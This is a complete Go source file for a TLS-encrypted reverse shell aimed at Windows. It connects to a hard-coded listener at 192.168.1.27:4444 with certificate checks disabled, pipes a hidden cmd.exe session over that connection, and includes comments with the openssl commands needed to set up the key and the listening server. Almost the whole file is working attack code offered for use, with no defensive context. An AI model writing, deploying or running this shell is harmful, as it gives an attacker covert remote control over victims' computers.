package main

// go get -v github.com/denji/golang-tls
// generate a key : openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
// cat key.pem cert.pem > test.pem
// server : openssl s_server -quiet -key key.pem -cert cert.pem -port <port>

import (
	"crypto/tls"
	"os/exec"
	"syscall"
)

func main() {

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	conn, err := tls.Dial("tcp", "192.168.1.27:4444", conf)

	if err != nil {
		println(err)
		return
	}

	defer conn.Close()

	cmd := exec.Command("cmd.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // for hide Windows
	cmd.Run()
}
